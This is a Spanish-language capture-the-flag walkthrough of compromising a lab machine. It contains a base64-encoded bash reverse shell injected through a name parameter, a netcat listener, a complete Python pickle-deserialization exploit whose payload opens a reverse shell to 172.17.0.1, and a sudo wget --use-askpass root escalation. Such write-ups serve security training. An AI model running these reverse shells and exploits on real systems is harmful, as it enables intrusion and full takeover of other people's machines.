## Reconocimiento:

Puerto 80 : HTTP

Hay un parametero para poner un nombre, pero se pueden concatenar comandos.

Vi muchas maneras, pero la mas sencilla y eficiente fué:

Encodear el payload en base64:

```bash
echo "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" | base64 
```

Me pongo en escucha:

```bash
nc -lnvp 4444
```

Lo ejecuto:

```bash
test;echo <PAYLOAD> | base64 -d | bash
```

Recibo una conexión.

## Escalada www-data - matsi

Encuentro un repositorio en la carpeta /opt

```bash
ls -la /opt
# Info:
.git
```

Toca pasarlo a mi maquina host.

Dentro lo puedo leer mejor:

```bash
git ls-files
# Info
- app.py
- objetivos.bin
```

Interesa el archivo app.py, así que toca inspeccionarlo:

Analizando el código, observamos que es vulnerable a **pickle deserialization**, concretamente en el siguiente fragmento:

```python
objetivos.append(pickle.loads(data)) # ¡DESERIALIZACIÓN SIN VALIDACIÓN!# ==============================================
blob=recv_bytes(conn) # Recibe bytes del cliente
guardar_objetivo(blob) # Guarda en objetivos.bin
```

La deserialización insegura con `pickle` en Python permite ejecución remota de código (RCE) al deserializar datos no confiables. Pickle reconstruye objetos serializados, incluyendo la ejecución de métodos especiales como `__reduce__()`.

Encuentro un script en Python para obtener una rev shell y lo copio en la máquina victima:

```python
cat > /tmp/revshell_exploit.py << 'EOF'
import socket
import pickle
import os
import time

class ReverseShell:
    def __reduce__(self):
       
        # Usando diferentes payloads por si uno falla
        cmd = ('/bin/bash -c "bash -i >& /dev/tcp/172.17.0.1/7777 0>&1 &"')
        return os.system, (cmd,)

def send_exploit():
    host = "127.0.0.1"
    port = 6969
    
    print("[+] Creando payload de reverse shell...")
    payload = pickle.dumps(ReverseShell())
    print(f"[+] Payload size: {len(payload)} bytes")
    
    print(f"[+] Conectando a {host}:{port}...")
    
    try:
        # Paso 1: Guardar payload
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Recibir menú
        s.recv(1024)
        # Opción 2: Escribir nuevo objetivo
        s.send(b"2\n")
        
        # Nombre
        s.recv(1024)
        s.send(b"revshell\n")
        
        # Edad
        s.recv(1024)
        s.send(b"0\n")
        
        # Objetivo
        s.recv(1024)
        print("[+] Enviando payload...")
        s.send(payload)
        s.send(b"\n")  # Terminar
        
        resp = s.recv(1024).decode()
        print(f"[+] Respuesta: {resp}")
        s.close()
        
        print("[+] Payload guardado. Esperando 2 segundos...")
        time.sleep(2)
        
        # Paso 2: Desencadenar deserialización
        print("[+] Activando reverse shell...")
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2.connect((host, port))
        s2.recv(1024)
        s2.send(b"1\n")  # Leer objetivos (deserializa)
        
        try:
            # Intentar leer respuesta (puede fallar si se ejecuta shell)
            s2.settimeout(2)
            resp2 = s2.recv(4096).decode()
            print(f"[+] Respuesta deserialización: {resp2[:100]}...")
        except socket.timeout:
            print("[+] Deserialización ejecutada (timeout esperado)")
        except Exception as e:
            print(f"[+] Error de lectura: {e}")
        
        s2.close()
        
        print("[+] Reverse shell enviada. Revisa tu listener...")
        
    except ConnectionRefusedError:
        print("[-] No se puede conectar al servicio")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    send_exploit()
EOF
```

Desde el host me pongo en escucha:

```python
nc -lnvp 7777
```

Y lo ejecuto:

```python
python3 /tmp/revshell_exploit.py
```

Recibo conexión.

## Escalada matsi → root

```python
sudo -l
(ALL : ALL) NOPASSWD: /usr/bin/wget
```

Gracias GTFO Bins:

La idea es **aprovechar la opción `--use-askpass` de `wget` para ejecutar una shell** en lugar de un programa que solicite una contraseña. Dependiendo de cómo esté configurado `sudo` y el sistema. 
TF=$(mktemp)      # Crea un archivo temporal
chmod +x $TF      # Lo hace ejecutable
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF  # Escribe un script que abre una shell
sudo wget --use-askpass=$TF 0           # Intenta que wget ejecute ese script como askpass
```

Listo.
